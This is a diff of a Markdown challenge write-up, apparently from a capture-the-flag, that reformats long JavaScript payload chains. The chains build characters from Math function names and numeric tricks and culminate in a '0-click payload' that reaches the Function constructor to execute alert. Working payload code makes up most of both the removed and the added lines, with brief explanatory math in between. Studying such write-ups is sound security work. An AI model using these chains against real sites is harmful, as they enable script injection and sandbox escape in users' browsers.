@@ -224,14 +224,7 @@ $$
 e^x - 1 \approx 10
 $$
 
-So, to get `()` in our result we use this function chain: 
-
-
-Math.random.name.localeCompare.name.length.toString,\
-Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,\
-Math.seeds.push,Math.sqrt,Math.expm1,Math.random.name.localeCompare.name.length.toString,\
-Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push
-
+So, to get `()` in our result we use this function chain: `Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.expm1,Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push`
 
 Let’s put it in our q parameter to see if it would work
 
@@ -241,30 +234,13 @@ For the reason I explained above we need to put it first because since the funct
 
 and then we shift the seeds when we need `(` because the shift is going to remove the first element and pass it to the next function called while pop is going to remove the last 
 
-In this way we get `()alert` 
-
-Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,\
-Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.expm1,\
-Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,\
-Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.floor,\
-Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,\
-Math.seeds.shift,Math.floor,Math.random.name.anchor.name.at,Math.seeds.push,Math.acos,\
-Math.random.prototype.constructor.name.link.name.at,Math.seeds.push,Math.E.constructor.name.at,\
-Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.cbrt,Math.log2,Math.trunc.name.at,\
-Math.seeds.push,Math.seeds.toString,Math.random.name.toString,Math.seeds.toString,Math.random.name.toString,\
-Math.seeds.join
+In this way we get `()alert` `Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.expm1,Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.random.name.anchor.name.at,Math.seeds.push,Math.acos,Math.random.prototype.constructor.name.link.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.cbrt,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.seeds.toString,Math.random.name.toString,Math.seeds.toString,Math.random.name.toString,Math.seeds.join`
 
 ![img1](./imgs/8.png)
 
 Now we need to shift the first element and push it to get `)alert(`
 
-Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,\
-Math.seeds.push,Math.sqrt,Math.expm1,Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,\
-Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.seeds.shift,\
-Math.floor,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.random.name.anchor.name.at,Math.seeds.push,Math.acos,\
-Math.random.prototype.constructor.name.link.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.E.constructor.name.at,\
-Math.seeds.push,Math.cbrt,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.seeds.toString,\
-Math.random.name.toString,Math.seeds.toString,Math.random.name.toString,Math.seeds.join
+`Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.expm1,Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.seeds.shift,Math.floor,Math.random.name.anchor.name.at,Math.seeds.push,Math.acos,Math.random.prototype.constructor.name.link.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.cbrt,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.seeds.toString,Math.random.name.toString,Math.seeds.toString,Math.random.name.toString,Math.seeds.join`
 
 The new problem occurs when we have to create the `.` character, we will again rely on `String.fromCharCode`, now we need to get the value 46 from 15 somehow… Since $e$ is close enough to $2$ we can play with $e^x$ and $log_2(x)$. We’ve found the exact value of $x$ after different tests:
 
@@ -284,20 +260,7 @@ $$
 
 So now our payload has this part `Math.cos,Math.clz32,Math.exp,Math.log2,Math.abs.name.constructor.fromCharCode,Math.seeds.push`. 
 
-Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,\
-Math.seeds.push,Math.sqrt,Math.expm1,Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,\
-Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,\
-Math.seeds.shift,Math.floor,Math.random.name.anchor.name.at,Math.seeds.push,Math.acos,\
-Math.random.prototype.constructor.name.link.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,\
-Math.E.constructor.name.at,Math.seeds.push,Math.cbrt,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.seeds.shift,\
-Math.seeds.push,Math.clz32,Math.sqrt,Math.fround.name.at,Math.seeds.push,\
-Math.cbrt,Math.acos.name.at,Math.seeds.push,Math.log10,Math.cos.name.at,Math.seeds.push,Math.cbrt,Math.trunc.name.at,\
-Math.seeds.push,Math.log2,Math.expm1.name.at,Math.seeds.push,Math.log2,Math.seeds.at,Math.seeds.push,Math.log2,\
-Math.trunc.name.at,Math.seeds.push,Math.cos,Math.trunc.name.at,Math.seeds.push,Math.cos,Math.clz32,Math.exp,\
-Math.log2,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.asinh,Math.round,Math.seeds.find.name.at,\
-Math.seeds.push,Math.asinh,Math.round,Math.seeds.isPrototypeOf.name.at,Math.seeds.push,Math.cos,Math.seeds.map.name.at,\
-Math.seeds.push,Math.sin,Math.seeds.at.name.at,Math.seeds.push,Math.sin,Math.seeds.includes.name.at,Math.seeds.push,\
-Math.cbrt,Math.seeds.find.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.random.name.toString,Math.seeds.join
+`Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.expm1,Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.floor,Math.random.name.anchor.name.at,Math.seeds.push,Math.acos,Math.random.prototype.constructor.name.link.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.cbrt,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.clz32,Math.sqrt,Math.fround.name.at,Math.seeds.push,Math.cbrt,Math.acos.name.at,Math.seeds.push,Math.log10,Math.cos.name.at,Math.seeds.push,Math.cbrt,Math.trunc.name.at,Math.seeds.push,Math.log2,Math.expm1.name.at,Math.seeds.push,Math.log2,Math.seeds.at,Math.seeds.push,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.cos,Math.trunc.name.at,Math.seeds.push,Math.cos,Math.clz32,Math.exp,Math.log2,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.asinh,Math.round,Math.seeds.find.name.at,Math.seeds.push,Math.asinh,Math.round,Math.seeds.isPrototypeOf.name.at,Math.seeds.push,Math.cos,Math.seeds.map.name.at,Math.seeds.push,Math.sin,Math.seeds.at.name.at,Math.seeds.push,Math.sin,Math.seeds.includes.name.at,Math.seeds.push,Math.cbrt,Math.seeds.find.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.random.name.toString,Math.seeds.join`
 
 ![img1](./imgs/9.png)
 
@@ -309,22 +272,6 @@ The final 0-click payload looks like this:
 
 ### 0-click payload
 
-Math.random.name.localeCompare.name.length.toString,Math.log2,Math.expm1,Math.ceil,\
-Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.expm1,\
-Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,\
-Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,\
-Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.floor,Math.random.name.anchor.name.at,\
-Math.seeds.push,Math.acos,Math.random.prototype.constructor.name.link.name.at,Math.seeds.push,\
-Math.E.constructor.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.cbrt,\
-Math.log2,Math.trunc.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.clz32,Math.sqrt,\
-Math.fround.name.at,Math.seeds.push,Math.cbrt,Math.acos.name.at,Math.seeds.push,Math.log10,\
-Math.cos.name.at,Math.seeds.push,Math.cbrt,Math.trunc.name.at,Math.seeds.push,Math.log2,Math.expm1.name.at,\
-Math.seeds.push,Math.log2,Math.seeds.at,Math.seeds.push,Math.log2,Math.trunc.name.at,Math.seeds.push,\
-Math.cos,Math.trunc.name.at,Math.seeds.push,Math.cos,Math.clz32,Math.exp,Math.log2,Math.abs.name.constructor.fromCharCode,\
-Math.seeds.push,Math.asinh,Math.round,Math.seeds.find.name.at,Math.seeds.push,Math.asinh,Math.round,\
-Math.seeds.isPrototypeOf.name.at,Math.seeds.push,Math.cos,Math.seeds.map.name.at,Math.seeds.push,Math.sin,\
-Math.seeds.at.name.at,Math.seeds.push,Math.sin,Math.seeds.includes.name.at,Math.seeds.push,Math.cbrt,\
-Math.seeds.find.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.random.name.toString,Math.seeds.join,\
-Math.constructor.constructor,Math.constructor.call.call
+`Math.random.name.localeCompare.name.length.toString,Math.log2,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.expm1,Math.random.name.localeCompare.name.length.toString,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.floor,Math.random.name.anchor.name.at,Math.seeds.push,Math.acos,Math.random.prototype.constructor.name.link.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.E.constructor.name.at,Math.seeds.push,Math.cbrt,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.clz32,Math.sqrt,Math.fround.name.at,Math.seeds.push,Math.cbrt,Math.acos.name.at,Math.seeds.push,Math.log10,Math.cos.name.at,Math.seeds.push,Math.cbrt,Math.trunc.name.at,Math.seeds.push,Math.log2,Math.expm1.name.at,Math.seeds.push,Math.log2,Math.seeds.at,Math.seeds.push,Math.log2,Math.trunc.name.at,Math.seeds.push,Math.cos,Math.trunc.name.at,Math.seeds.push,Math.cos,Math.clz32,Math.exp,Math.log2,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.asinh,Math.round,Math.seeds.find.name.at,Math.seeds.push,Math.asinh,Math.round,Math.seeds.isPrototypeOf.name.at,Math.seeds.push,Math.cos,Math.seeds.map.name.at,Math.seeds.push,Math.sin,Math.seeds.at.name.at,Math.seeds.push,Math.sin,Math.seeds.includes.name.at,Math.seeds.push,Math.cbrt,Math.seeds.find.name.at,Math.seeds.push,Math.seeds.shift,Math.seeds.push,Math.random.name.toString,Math.seeds.join,Math.constructor.constructor,Math.constructor.call.call`
 
 ![img1](./imgs/10.png)
